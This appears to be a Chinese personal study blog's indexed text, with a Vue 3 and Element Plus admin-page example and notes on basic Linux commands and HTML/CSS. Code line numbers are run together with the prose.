const关键字用于声明一个常量，这意味着一旦给定值，就无法更改。使用const可以创建不可变的响应式数据，从而避免在组件中修改数据导致的不必要的错误。在Vue组件中，可以将const数组绑定到模板中的元素上，以实现数据的动态展示。例如，可以将const数组绑定到列表渲染指令v-for上，以循环渲染列表项。当数组中的元素发生变化时，Vue会自动更新视图。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410&lt;script lang=&quot;ts&quot; setup&gt;import &#123; Menu as IconMenu, User, Shop, Setting, PieChart, Tickets, Expand, Promotion, Rank, HelpFilled, Edit, Delete, Star, Box, Check, Close&#125; from &#x27;@element-plus/icons-vue&#x27;const handleOpen = (key: string, keyPath: string[]) =&gt; &#123; console.log(key, keyPath)&#125;const handleClose = (key: string, keyPath: string[]) =&gt; &#123; console.log(key, keyPath)&#125;import &#123; ref &#125; from &#x27;vue&#x27;//导入const value1 = ref(true)const value2 = ref(true)const input = ref(&#x27;&#x27;)const currentPage1 = ref(5)const currentPage2 = ref(5)const currentPage3 = ref(5)const currentPage4 = ref(4)const pageSize2 = ref(100)const pageSize3 = ref(100)const pageSize4 = ref(100)const small = ref(false)const background = ref(false)const disabled = ref(false)const handleSizeChange = (val: number) =&gt; &#123; console.log(`$&#123;val&#125; items per page`)&#125;const handleCurrentChange = (val: number) =&gt; &#123; console.log(`current page: $&#123;val&#125;`)&#125;//const数组,侧边栏const ment = [ &#123; name:&#x27;用户管理&#x27;, children:[ &#123; name:&#x27;用户列表1&#x27; &#125;, &#123; name:&#x27;用户列表2&#x27; &#125; ] &#125;, &#123; name:&#x27;权限管理&#x27;, children:[ &#123; name:&#x27;权限1&#x27; &#125;, &#123; name:&#x27;权限2&#x27; &#125; ] &#125;, &#123; name:&#x27;商品管理&#x27;, children:[ &#123; name:&#x27;商品1&#x27; &#125;, &#123; name:&#x27;商品2&#x27; &#125; ] &#125;, &#123; name:&#x27;订单管理&#x27;, children:[ &#123; name:&#x27;订单1&#x27; &#125;, &#123; name:&#x27;订单2&#x27; &#125; ] &#125;, &#123; name:&#x27;数据管理&#x27;, children:[ &#123; name:&#x27;数据1&#x27; &#125;, &#123; name:&#x27;数据2&#x27; &#125; ] &#125;, ]//表单输入信息const tableData = [ &#123; No: &#x27;1&#x27;, 姓名: &#x27;15285&#x27;, 邮箱: &#x27;14755798&#x27;, 手机: &#x27;185825695&#x27;, 角色: &#x27;gl&#x27;, value:true, 创建时间: &#x27;2023-12-11&#x27;, 操作: &#x27;&#x27; &#125;, &#123; No: &#x27;2&#x27;, 姓名: &#x27;root&#x27;, 邮箱: &#x27;1060368054@qq.com&#x27;, 手机: &#x27;18380546544&#x27;, 角色: &#x27;npc&#x27;, value:false, 创建时间: &#x27;2023-12-12&#x27;, 操作: &#x27;&#x27; &#125;, &#123; No: &#x27;3&#x27;, 姓名: &#x27;111&#x27;, 邮箱: &#x27;222222222@qq.com&#x27;, 手机: &#x27;15285236952&#x27;, 角色: &#x27;管理员&#x27;, value: true, 创建时间: &#x27;2022-12-13&#x27;, 操作: &#x27;&#x27; &#125;, &#123; No: &#x27;4&#x27;, 姓名: &#x27;admin&#x27;, 邮箱: &#x27;qwert@qq.com&#x27;, 手机: &#x27;12345678&#x27;, 角色: &#x27;超级管理员&#x27;, value:false, 创建时间: &#x27;2022-12-10&#x27;, 操作: &#x27;&#x27; &#125;, ]&lt;/script&gt;&lt;template&gt; &lt;div class=&quot;common-layout&quot;&gt; &lt;el-container&gt; &lt;el-aside class=&quot;aside_1&quot;&gt; &lt;el-row class=&quot;tac&quot;&gt; &lt;el-col :span=&quot;24&quot;&gt; &lt;el-menu active-text-color=&quot;#ffd04b&quot; background-color=&quot;#344155&quot; class=&quot;el-menu-vertical-demo&quot; default-active=&quot;2&quot; text-color=&quot;#fff&quot; @open=&quot;handleOpen&quot; @close=&quot;handleClose&quot; &gt; &lt;el-sub-menu index=&quot;1&quot;&gt; &lt;template #title&gt; &lt;el-icon size=&quot;50&quot;&gt;&lt;User /&gt;&lt;/el-icon&gt; &lt;span style=&quot;font-size: 22px;&quot;&gt;&#123;&#123;ment[0].name&#125;&#125;&lt;/span&gt; &lt;/template&gt; &lt;el-menu-item index=&quot;1-1&quot; style=&quot;font-size: 22px;&quot;&gt; &lt;el-icon size=&quot;50&quot;&gt;&lt;icon-menu /&gt;&lt;/el-icon&gt; &#123;&#123;ment[0].children[0].name&#125;&#125; &lt;/el-menu-item&gt; &lt;el-menu-item index=&quot;1-1&quot; style=&quot;font-size: 22px;&quot;&gt; &lt;el-icon size=&quot;50&quot;&gt;&lt;icon-menu /&gt;&lt;/el-icon&gt; &#123;&#123;ment[0].children[1].name&#125;&#125; &lt;/el-menu-item&gt; &lt;/el-sub-menu&gt; &lt;el-sub-menu index=&quot;2&quot;&gt; &lt;template #title&gt; &lt;el-icon size=&quot;50&quot;&gt;&lt;Setting /&gt;&lt;/el-icon&gt; &lt;span style=&quot;font-size: 22px;&quot;&gt;&#123;&#123;ment[1].name&#125;&#125;&lt;/span&gt; &lt;/template&gt; &lt;el-menu-item index=&quot;1-1&quot; style=&quot;font-size: 22px;&quot;&gt; &lt;el-icon size=&quot;50&quot;&gt;&lt;Setting /&gt;&lt;/el-icon&gt; &#123;&#123;ment[1].children[0].name&#125;&#125; &lt;/el-menu-item&gt; &lt;el-menu-item index=&quot;1-1&quot; style=&quot;font-size: 22px;&quot;&gt; &lt;el-icon size=&quot;50&quot;&gt;&lt;Setting /&gt;&lt;/el-icon&gt; &#123;&#123;ment[1].children[1].name&#125;&#125; &lt;/el-menu-item&gt; &lt;/el-sub-menu&gt; &lt;el-sub-menu index=&quot;3&quot;&gt; &lt;template #title&gt; &lt;el-icon size=&quot;50&quot;&gt;&lt;box /&gt;&lt;/el-icon&gt; &lt;span style=&quot;font-size: 22px;&quot;&gt;&#123;&#123;ment[2].name&#125;&#125;&lt;/span&gt; &lt;/template&gt; &lt;el-menu-item index=&quot;1-1&quot; style=&quot;font-size: 22px;&quot;&gt; &lt;el-icon size=&quot;50&quot;&gt;&lt;box /&gt;&lt;/el-icon&gt; &#123;&#123;ment[2].children[0].name&#125;&#125; &lt;/el-menu-item&gt; &lt;el-menu-item index=&quot;1-1&quot; style=&quot;font-size: 22px;&quot;&gt; &lt;el-icon size=&quot;50&quot;&gt;&lt;box /&gt;&lt;/el-icon&gt; &#123;&#123;ment[2].children[1].name&#125;&#125; &lt;/el-menu-item&gt; &lt;/el-sub-menu&gt; &lt;el-sub-menu index=&quot;4&quot;&gt; &lt;template #title&gt; &lt;el-icon size=&quot;50&quot;&gt;&lt;check /&gt;&lt;/el-icon&gt; &lt;span style=&quot;font-size: 22px;&quot;&gt;&#123;&#123;ment[3].name&#125;&#125;&lt;/span&gt; &lt;/template&gt; &lt;el-menu-item index=&quot;1-1&quot; style=&quot;font-size: 22px;&quot;&gt; &lt;el-icon size=&quot;50&quot;&gt;&lt;icon-menu /&gt;&lt;/el-icon&gt; &#123;&#123;ment[3].children[0].name&#125;&#125; &lt;/el-menu-item&gt; &lt;el-menu-item index=&quot;1-1&quot; style=&quot;font-size: 22px;&quot;&gt; &lt;el-icon size=&quot;50&quot;&gt;&lt;icon-menu /&gt;&lt;/el-icon&gt; &#123;&#123;ment[3].children[1].name&#125;&#125; &lt;/el-menu-item&gt; &lt;/el-sub-menu&gt; &lt;el-sub-menu index=&quot;5&quot;&gt; &lt;template #title&gt; &lt;el-icon size=&quot;50&quot;&gt;&lt;Rank /&gt;&lt;/el-icon&gt; &lt;span style=&quot;font-size: 22px;&quot;&gt;&#123;&#123;ment[4].name&#125;&#125;&lt;/span&gt; &lt;/template&gt; &lt;el-menu-item index=&quot;1-1&quot; style=&quot;font-size: 22px;&quot;&gt; &lt;el-icon size=&quot;50&quot;&gt;&lt;icon-menu /&gt;&lt;/el-icon&gt; &#123;&#123;ment[4].children[0].name&#125;&#125; &lt;/el-menu-item&gt; &lt;el-menu-item index=&quot;1-1&quot; style=&quot;font-size: 22px;&quot;&gt; &lt;el-icon size=&quot;50&quot;&gt;&lt;icon-menu /&gt;&lt;/el-icon&gt; &#123;&#123;ment[4].children[1].name&#125;&#125; &lt;/el-menu-item&gt; &lt;/el-sub-menu&gt; &lt;/el-menu&gt; &lt;/el-col&gt; &lt;/el-row&gt; &lt;/el-aside&gt; &lt;el-container&gt; &lt;el-header&gt; &lt;el-icon size=&quot;30px&quot; class=&quot;header_ico1&quot;&gt;&lt;Expand /&gt;&lt;/el-icon&gt; &lt;div class=&quot;header_ch&quot;&gt; &lt;a href=&quot;#&quot; style=&quot;color: black;text-decoration: none;font-size:30px&quot;&gt;&lt;b&gt;首页&lt;/b&gt;&lt;/a&gt; &lt;a href=&quot;#&quot; style=&quot;color: #1f1414;text-decoration: none;font-size:30px&quot;&gt;/&lt;/a&gt; &lt;a href=&quot;#&quot; style=&quot;color: #171414;text-decoration: none;font-size:30px&quot;&gt;&lt;b&gt;用户列表&lt;/b&gt;&lt;/a&gt; &lt;/div&gt; &lt;a href=&quot;#&quot; &gt;&lt;el-icon size=&quot;45px&quot; class=&quot;header_ico2&quot;&gt;&lt;Promotion /&gt;&lt;/el-icon&gt;&lt;/a&gt; &lt;a href=&quot;#&quot; &gt;&lt;el-icon size=&quot;45px&quot; class=&quot;header_ico3&quot;&gt;&lt;Rank /&gt;&lt;/el-icon&gt;&lt;/a&gt; &lt;a href=&quot;#&quot; &gt;&lt;el-icon size=&quot;45px&quot; class=&quot;header_ico4&quot;&gt;&lt;HelpFilled /&gt;&lt;/el-icon&gt;&lt;/a&gt; &lt;/el-header&gt; &lt;el-main&gt; &lt;div class=&quot;main_bl&quot;&gt; &lt;div class=&quot;main_bm&quot;&gt; &lt;div&gt; &lt;el-input class=&quot;inp_blank&quot; v-model=&quot;input&quot; placeholder=&quot;请输入搜索的用户姓名&quot; /&gt; &lt;div class=&quot;header_but&quot;&gt; &lt;el-button type=&quot;primary&quot; size=&quot;large&quot;&gt;&lt;span style=&quot;font-size: 20px;&quot;&gt;搜索&lt;/span&gt;&lt;/el-button&gt; &lt;el-button type=&quot;primary&quot; size=&quot;large&quot;&gt;&lt;span style=&quot;font-size: 20px;&quot;&gt;添加用户&lt;/span&gt;&lt;/el-button&gt; &lt;/div&gt; &lt;/div&gt; &lt;div style=&quot;width: ;&quot; &gt; &lt;el-table :data=&quot;tableData&quot; border style=&quot;width: 1500px&quot;&gt; &lt;el-table-column prop=&quot;No&quot; label=&quot;No&quot; width=&quot;100px&quot; /&gt; &lt;el-table-column prop=&quot;姓名&quot; label=&quot;Name&quot; width=&quot;120px&quot; /&gt; &lt;el-table-column prop=&quot;邮箱&quot; label=&quot;Email&quot; width=&quot;250px&quot; /&gt; &lt;el-table-column prop=&quot;手机&quot; label=&quot;Phone_number&quot; width=&quot;250px&quot; /&gt; &lt;el-table-column prop=&quot;角色&quot; label=&quot;Actor&quot; width=&quot;200px&quot;/&gt; &lt;el-table-column prop=&quot;状态&quot; label=&quot;state&quot; width=&quot;100px&quot; &gt; &lt;template v-slot=&quot;&#123; row &#125;&quot;&gt; &lt;el-switch v-model=&quot;row.value&quot; class=&quot;ml-2&quot; /&gt; &lt;/template&gt; &lt;/el-table-column&gt;/&gt; &lt;el-table-column prop=&quot;创建时间&quot; label=&quot;Creation_time&quot; width=&quot;200px&quot;/&gt; &lt;el-table-column prop=&quot;操作&quot; label=&quot;operation&quot; width=&quot;auto&quot; &gt; &lt;el-button type=&quot;primary&quot; :icon=&quot;Edit&quot; /&gt; &lt;el-button type=&quot;danger&quot; :icon=&quot;Delete&quot; /&gt; &lt;el-button type=&quot;warning&quot; :icon=&quot;Star&quot; /&gt; &lt;/el-table-column&gt;/&gt; &lt;/el-table&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;main_page&quot;&gt; &lt;div class=&quot;demo-pagination-block&quot;&gt; &lt;div class=&quot;demonstration&quot;&gt;&lt;/div&gt; &lt;el-pagination v-model:current-page=&quot;currentPage4&quot; v-model:page-size=&quot;pageSize4&quot; :page-sizes=&quot;[10, 20, 30, 40]&quot; :small=&quot;small&quot; :disabled=&quot;disabled&quot; :background=&quot;background&quot; layout=&quot;total, sizes, prev, pager, next, jumper&quot; :total=&quot;4&quot; @size-change=&quot;handleSizeChange&quot; @current-change=&quot;handleCurrentChange&quot; /&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/el-main&gt; &lt;/el-container&gt; &lt;/el-container&gt; &lt;/div&gt;&lt;/template&gt;&lt;style scoped&gt;.aside_1&#123; width: 15%; height: 100vh; background-color: #344155;&#125;.header_ico1&#123; position:relative; top: 20px;&#125;.header_ico2&#123; position: absolute; top: 20px; left: 1670px;&#125;.header_ico3&#123; position: absolute; top: 20px; left: 1730px;&#125;.header_ico4&#123; position: absolute; top: 20px; left: 1790px;&#125;.inp_blank&#123; width: 400px; height: 40px;&#125;table &#123; margin-top: 10px; border: 1px solid #171515; border-collapse: collapse; text-align: center;&#125;th,td &#123; border: 1px solid #151414; text-align: center;&#125;.header_but&#123; position: relative; left: 420px; top: -40px;&#125;.main_bl&#123; border: 1px solid #171414; position: absolute; top:100px; height: 580px; width: 1560px; box-shadow: 0px 5px 5px rgba(0,0,0,0.2); &#125;.main_bm&#123; position: relative; top:25px; left: 20px; &#125;.header_ch&#123; position: relative; left: 60px; top: -18px;&#125;.demo-pagination-block + .demo-pagination-block &#123; margin-top: 10px;&#125;.demo-pagination-block .demonstration &#123; margin-bottom: 16px;&#125;.main_page&#123; position: relative; top: 40px; left: 1100px;&#125;&lt;/style&gt; 运行效果图","path":"2023/12/08/vue学习/","date":"12-08","excerpt":"","tags":[{"name":"安装","slug":"安装","permalink":"http://example.com/tags/%E5%AE%89%E8%A3%85/"},{"name":"学习","slug":"学习","permalink":"http://example.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"vue","slug":"vue","permalink":"http://example.com/tags/vue/"}]},{"title":"linux命令补充","text":"今天补充之前学的Linux命令 Linux 查询命令man命令linux中使用man命令来查询命令的帮助文件,命令格式如下: 1man [章节] command 常用命令如下： 1d, Ctrl+D: 向文件尾部翻半屏；u, Ctrl+U: 向文件首部翻半屏； q: 退出； #：跳转至第#行； home: 回到文件首部； end：翻至文件尾部。 命令的帮助文件通常存放在/usr/share/man目录下。 man包含9个章节，章节用数字表示，分别是： 1用户命令 系统调用 C库调用设备文件及特殊文件 配置文件格式 游戏杂项 管理类的命令Linux 内核API 使用man搜索命令 以KEYWORD指定的字符串为关键字，从当前位置向文件首部搜索，不区分字符大小写； 1n: 下一个 N：上一个 Linux info命令linux中使用info命令来查询命令的帮助文件。info页面比man page编写得要更好、更容易理解，也更友好，但man page使用起来确实要更容易得多。一个man page只有一页，而info页面几乎总是将它们的内容组织成多个区段（称为节点），每个区段也可能包含子区段（称为子节点）。 命令格式如下： 1info [命令参数] command 常用命令参数选项： 1-d：添加包含info格式帮助文档的目录；-f：指定要读取的info格式的帮助文档；-n：指定首先访问的info帮助文件的节点；-o：输出被选择的节点内容到指定文件。 常见命令如下： 1?键：它就会显示info的常用快捷键；N键：显示（相对于本节点的）下一节点的文档内容；P键：显示（相对于本节点的）前一节点的文档内容；U键：进入当前命令所在的主题；M键：敲M键后输入命令的名称就可以查看该命令的帮助文档了；G键：敲G键后输入主题名称，进入该主题；L键：回到上一个访问的页面；SPACE键：向前滚动一页；BACKUP或DEL键：向后滚动一页；Q：退出info。 Linux文件&#x2F;目录管理chattr​ chattr的作用是修改文件&#x2F;目录的特殊属性。 具体命令如下： 将目录testDir以及目录下所有内容一并设置为不得任意更动，具体使用如下命令： 1chattr [+|-|=] 属性标示符 命令参数 文件/目录 常用命令参数如下： 12-R：递归处理，将指令目录下的所有文件及子目录一并处理；-V：显示指令执行过程；+&lt;属性标示符&gt;：开启文件或目录的该项属性；-&lt;属性标示符&gt;：关闭文件或目录的该项属性；=&lt;属性标示符&gt;：指定文件或目录的该项属性。 常用属性标示符： 1a：让文件或目录仅供附加用途；A：不更新文件或目录的最后存取时间；c：将文件或目录压缩后存放；d：将文件或目录排除在倾倒操作之外；i：不得任意更动文件或目录；s：保密性删除文件或目录；S：即时更新文件或目录；u：预防意外删除。 lsattrlsattr的作用查看文件&#x2F;目录的特殊属性设置情况。 具体命令如下： 1lsattr 命令参数 文件/目录 常用参数如下： 1-R：递归的操作方式；-V：显示指令的版本信息；-a：列出目录中的所有文件，包括隐藏文件。 查看目录testDir下所有内容的特殊属性，具体使用如下命令： 1lsattr -Ra testFile Linux硬链接ln 源文件 目标文件 为当前目录下的文件testFile创建一个硬链接testFileLink，可以使用如下命令： 1ln testFile testFileLink Linux软链接ln -s 源文件 目标文件 为当前目录下的文件testFile创建一个软链接myLink，可以使用如下命令： 1ln -s testFile myLink 设置文件&#x2F;目录的特殊权限setuid和setgid。 setuid的八进制表示为4000 setgid的八进制表示为2000 setuid的作用是让执行该命令的用户以该命令拥有者的权限去执行。 数字设置命令：chmod 4xxx 文件/目录 助记语法设置命令：chmod u [+|-] s 文件/目录 创建一个新文件testFile，使用数字设置方法为文件testFile添加setuid权限，具体使用如下命令： 1touch testFilels -l testFilesudo chmod 4764 testFilels -l testFile setgid 数字设置命令：chmod 2xxx 文件/目录 助记语法设置命令：chmod g [+|-] s 文件/目录 创建一个新文件testFile，使用数字设置方法为文件testFile添加setgid权限，具体使用如下命令： 1touch testFilels -l testFilesudo chmod 2674 testFilels -l testFile Linux压缩和归档文件tar命令打包tar命令可以将多个文件&#x2F;目录进行打包，将多个文件生成一个文件，生成的文件后缀为.tar。 具体打包命令如下： 1tar -cvf 生成的tar包名 要打包的文件/目录列表 常用命令参数如下： 1-c 建立新的归档文件；-v 处理过程中输出相关信息；-f 对普通文件操作； 压缩采用bzip2方式执行tar命令进行压缩的具体命令如下： 1tar -jcvf 指定生成的压缩文件名 要被压缩的文件/目录列表 常用命令参数如下： 1-c 建立新的归档文件；-v 处理过程中输出相关信息；-f 对普通文件操作；-j 以bzip2对文件/目录进行压缩； 采用gzip进行压缩的具体命令如下： 1tar -zcvf 指定生成的压缩文件名 要被压缩的文件/目录列表 常用命令参数如下： 1-c 建立新的归档文件；-v 处理过程中输出相关信息；-f 对普通文件操作；-z 以gzip对文件/目录进行压缩； 解压1tar -jxvf 指定要解压的文件 常用命令参数如下： 1-x 或--ext\\fract或--get：从备份文件中还原文件；-v 处理过程中输出相关信息；-f 对普通文件操作；-j 以bunzip2进行解压缩； 采用gzip进行解压的具体命令如下： 1tar -zxvf 指定要解压的文件 常用命令参数如下： 1-x 或--ext\\fract或--get：从备份文件中还原文件；-v 处理过程中输出相关信息；-f 对普通文件操作；-z 以gunzip进行解压缩； 1bunzip2 命令参数 指定要解压的文件 常用命令参数如下： 1-f或--force：解压缩时，若输出的文件与现有文件同名时，预设不会覆盖现有的文件；-k或——keep：在解压缩后，预设会删除原来的压缩文件。若要保留压缩文件，请使用此参数；-v或——verbose：解压缩文件时，显示详细的信息； 1gunzip 命令参数 指定要解压的文件 常用命令参数如下： 1-f或-force：强行解开压缩文件，不理会文件名称或硬连接是否存在以及该文件是否为符号连接；-l或-list：列出压缩文件的相关信息；-q或-quiet：不显示警告信息；-r或-recursive：递归处理，将指定目录下的所有文件及子目录一并处理；-v或-verbose：显示指令执行过程； 1unzip 命令参数 指定要解压的文件 常用命令参数如下： 1-q：执行时不显示任何信息；-n：解压缩时不要覆盖原有的文件；-d&lt;目录&gt;：指定文件解压缩后所要存储的目录； Linux文件定位命令查询命令-locatelocate具体命令如下： 1locate 命令参数 文件/目录 常用命令参数如下： 12345-c, --count 只输出找到的数量；-d, --database DBPATH 使用DBPATH指定的数据库，而不是默认数据库/var/lib/mlocate/mlocate.db；-i, --ignore-case 忽略大小写；-q, --quiet 安静模式，不会显示任何错误讯息；-e, --existing 只显示当前存在的文件条目； 查询命令-which&#x2F;whereis使用which命令定位passwd命令的位置，具体使用如下命令： 1which passwd whereis具体命令如下： 1whereis 命令参数 文件名 常用命令参数如下： 123456-b：只查找二进制文件；-B&lt;目录&gt;：只在设置的目录下查找二进制文件；-m：只查找说明文件；-M&lt;目录&gt;：只在设置的目录下查找说明文件；-s：只查找原始代码文件；-S&lt;目录&gt;只在设置的目录下查找原始代码文件； find1find 查找目录 查找参数 查找内容 常用查找参数如下： 123456789101112131415161718192021-amin&lt;+|-分钟&gt;：查找在指定时间曾被存取过的文件或目录，单位以分钟计算；-atime&lt;+|-24小时数&gt;：查找在指定时间曾被存取过的文件或目录，单位以24小时计算；-cmin&lt;+|-分钟&gt;：查找在指定时间之时被更改过的文件或目录；-ctime&lt;+|-24小时数&gt;：查找在指定时间之时被更改的文件或目录，单位以24小时计算；-mmin&lt;+|-分钟&gt;：查找在指定时间曾被更改过的文件或目录，单位以分钟计算；-mtime&lt;+|-24小时数&gt;：查找在指定时间曾被更改过的文件或目录，单位以24小时计算；-depth：从指定目录下最深层的子目录开始查找；-exec&lt;执行指令&gt;：假设find指令的回传值为True，就执行该指令；-follow：排除符号连接；-gid&lt;群组识别码&gt;：查找符合指定群组识别码的文件或目录；-group&lt;群组名称&gt;：查找符合指定群组名称的文件或目录；-uid&lt;用户识别码&gt;：查找符合指定的用户识别码的文件或目录；-user&lt;拥有者名称&gt;：查找符和指定的拥有者名称的文件或目录；-name&lt;范本样式&gt;：指定字符串作为寻找文件或目录的范本样式；-iname&lt;范本样式&gt;：此参数的效果和指定“-name”参数类似，但忽略字符大小写的差别；-inum&lt;inode编号&gt;：查找符合指定的inode编号的文件或目录；-newer&lt;参考文件或目录&gt;：查找其更改时间较指定文件或目录的更改时间更接近现在的文件或目录；-size&lt;+|-|=文件大小&gt;：查找符合指定的文件大小的文件；-type&lt;文件类型&gt;：只寻找符合指定的文件类型的文件；-a：是前后条件都要满足；-o ：是满足一个条件就好； +：表示大于设置值的文件； - ：表示小于设置值的文件； = ：表示等于设置值的文件； 常见文件类型： 1234567f：普通文件l：符号链接d：目录c：字符设备b：块设备s：套接字p：Fifo 常见文件大小单位： b —— 块（512字节） c —— 字节 w —— 字（2字节） k —— 千字节 M —— 兆字节 G —— 吉字节 查找/etc目录下大于1M的文件&#x2F;目录的详细信息，具体使用如下命令： 1sudo find /etc -size 1M -exec ls -l &#123;&#125; \\; Linux 远程联机服务Telnet远程登录服务器 telnet 命令格式： 1telnet 选项 参数 常见选项： 12345-a：尝试自动登入远端系统；-b&lt;主机别名&gt;：使用别名指定远端主机名称；-K：不自动登入远端主机；-l&lt;用户名称&gt;：指定要登入远端主机的用户名称；-e&lt;脱离字符&gt;：设置脱离字符； 参数： 12远程主机：指定要登录进行管理的远程主机；端口：指定TELNET协议使用的端口号； telnet常见命令当我们执行输入telnet后回车，我们就进行了telnet的命令模式，telnet常见的命令： logout：强制退出远程登录用户并关闭连接； open：新打开一个连接； display：显示当前操作系统参数； quit：退出telnet； z：挂起telnet； rsh远程登录 更新软件源：sudo apt-get update 安装Rsh服务器：sudo apt-get install rsh-server 1rsh` 命令格式：`rsh 选项 参数 常见选项： 123-d：使用Socket层级的排错功能。-n：把输入的指令号向代号为/dev/null的特殊外围设备。-l&lt;用户名称&gt;：指定要登入远端主机的用户名称； 参数： 12远程主机：指定要登录进行管理的远程主机；命令：指定执行的命令；","path":"2023/12/06/linux命令补充/","date":"12-06","excerpt":"","tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"基础知识","slug":"基础知识","permalink":"http://example.com/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"学习","slug":"学习","permalink":"http://example.com/tags/%E5%AD%A6%E4%B9%A0/"}]},{"title":"html和css学习","text":"今天归纳一下学习的HTML和css。 HTML​ HTML5是一种标记语言，用于构建和呈现互联网上的超文本内容。它是HTML的最新版本，增加了很多新的元素和API，使得创建更丰富、更交互的Web应用变得更加容易。 语义元素​ HTML5引入了许多新的语义元素，例如&lt;header&gt;, &lt;footer&gt;, &lt;article&gt;, &lt;section&gt;, &lt;nav&gt;和&lt;aside&gt;等，它们使得页面的结构更加清晰，也更有利于搜索引擎优化和辅助阅读技术的使用。 开始标签 元素内容 结束标签 This is a paragraph This is a link 换行 ​ HTML 元素以开始标签起始，以结束标签终止，元素的内容*是开始标签与结束标签之间的内容。 ​ HTML 标签可以拥有属性。属性提供了有关 HTML 元素的更多的信息。 ​ 属性总是以名称&#x2F;值对的形式出现，比如：*name&#x3D;”value”*。 ​ 属性总是在 HTML 元素的开始标签中规定。 ​ HTML 链接由 标签定义。链接的地址在 href 属性中指定： 1&lt;a href=&quot;http://www.w3school.com.cn&quot;&gt;This is a link&lt;/a&gt; 定义标题的开始 1&lt;h1 align=&quot;center&quot;&gt; 拥有关于对齐方式的附加信息。 段落与文字标签 标签 语义 说明 ~ header 标题 paragraph 段落 break 换行 horizontal rule 水平线 division 分割（块元素） span 区域（行内元素） 超链接使用a标签，语法如下： 列表标签 标签 语义 说明 ol ordered list 有序列表 ul unordered list 无序列表 dl definition list 定义列表 图片标签 语法： 属性 说明 src 图像的文件地址 alt 图片显示不出来时的提示文字 title 鼠标移到图片上的提示文字 HTML3种列表 列表有3种：有序列表、无序列表和定义列表。,,。 表单控件​ 表单控件: HTML5为表单提供了新的输入类型（如email, date, time, url, search, range, color等），以及新的属性（如placeholder, required, autofocus等），使得表单的创建更加方便，用户的体验也更好。 &lt;form&gt; 元素HTML 表单用于收集用户输入。 &lt;/form&gt; 元素是最重要的表单元素。 元素有很多形态，根据不同的 type 属性。 类型 描述 text 定义常规文本输入。 radio 定义单选按钮输入（选择多个选择之一） submit 定义提交按钮（提交表单） 定义用于文本输入的单行输入字段： 定义用于向表单处理程序（form-handler）提交表单的按钮。 表单处理程序通常是包含用来处理输入数据的脚本的服务器页面。 元素（下拉列表）​ 元素定义下拉列表 元素定义待选择的选项。 列表通常会把首个选项显示为被选选项。 元素 元素定义多行输入字段（文本域） 元素 元素定义可点击的按钮 form表单有get和post传递参数。 ​ 两个简易的表单效果图 HTML页面框架布局​ HTML页面框架布局通常指的是页面的整体结构，包括页头（header）、页脚（footer）、导航栏（nav）、主要内容区（main）以及侧边栏（aside）等部分。 ​ 利用学的HTML制作的一个简易页面，每个图片都是一个div盒子 CSSCSS 选择器​ CSS 选择器用于“查找”（或选取）要设置样式的 HTML 元素。 我们可以将 CSS 选择器分为五类： 简单选择器（根据名称、id、类来选取元素） 组合器选择器（根据它们之间的特定关系来选取元素） 伪类选择器（根据特定状态选取元素） 伪元素选择器（选取元素的一部分并设置其样式） 属性选择器（根据属性或属性值来选取元素） ​ 元素选择器根据元素名称来选择 HTML 元素。id 名称不能以数字开头。 CSS 语法CSS 规则集（rule-set）由选择器和声明块组成： 选择器指向您需要设置样式的 HTML 元素。 声明块包含一条或多条用分号分隔的声明。 每条声明都包含一个 CSS 属性名称和一个值，以冒号分隔。 多条 CSS 声明用分号分隔，声明块用花括号括起来。 导航栏易用的导航对于任何网站都很重要。 通过使用 CSS，您可以将无聊的 HTML 菜单转换为美观的导航栏。 导航栏 &#x3D; 链接列表 导航栏需要标准 HTML 作为基础。 在我们的实例中，将用标准的 HTML 列表构建导航栏。 导航栏基本上就是链接列表，因此使用 和 元素会很有意义 CSS 边框样式border-style 属性指定要显示的边框类型。 允许以下值： dotted - 定义点线边框 dashed - 定义虚线边框 solid - 定义实线边框 double - 定义双边框 groove - 定义 3D 坡口边框。效果取决于 border-color 值 ridge - 定义 3D 脊线边框。效果取决于 border-color 值 inset - 定义 3D inset 边框。效果取决于 border-color 值 outset - 定义 3D outset 边框。效果取决于 border-color 值 none - 定义无边框 hidden - 定义隐藏边框 border-style 属性可以设置一到四个值（用于上边框、右边框、下边框和左边框）。 CSS 背景CSS background-colorbackground-color 属性指定元素的背景色。 页面的背景色设置如下： 123body &#123; background-color: lightblue;&#125; 有效的颜色名称 - 比如 “red” 十六进制值 - 比如 “#ff0000” RGB 值 - 比如 “rgb(255,0,0)” 不透明度 &#x2F; 透明度opacity 属性指定元素的不透明度&#x2F;透明度。取值范围为 0.0 - 1.0。值越低，越透明 设置链接样式链接可以使用任何 CSS 属性（例如 color、font-family、background 等）来设置样式。 a:link - 正常的，未访问的链接 a:visited - 用户访问过的链接 a:hover - 用户将鼠标悬停在链接上时 a:active - 链接被点击时 三种使用 CSS 的方法外部 CSS通过使用外部样式表，您只需修改一个文件即可改变整个网站的外观！ 每张 HTML 页面必须在 head 部分的 元素内包含对外部样式表文件的引用。 内部 CSS如果一张 HTML 页面拥有唯一的样式，那么可以使用内部样式表。 内部样式是在 head 部分的 元素中进行定义。 行内 CSS行内样式（也称内联样式）可用于为单个元素应用唯一的样式。 如需使用行内样式，请将 style 属性添加到相关元素。style 属性可包含任何 CSS 属性。 边距CSS 拥有用于为元素的每一侧指定外边距的属性： margin-top margin-right margin-bottom margin-left 所有外边距属性都可以设置以下值： auto - 浏览器来计算外边距 length - 以 px、pt、cm 等单位指定外边距 % - 指定以包含元素宽度的百分比计的外边距 inherit - 指定应从父元素继承外边距 CSS 拥有用于为元素的每一侧指定内边距的属性： padding-top padding-right padding-bottom 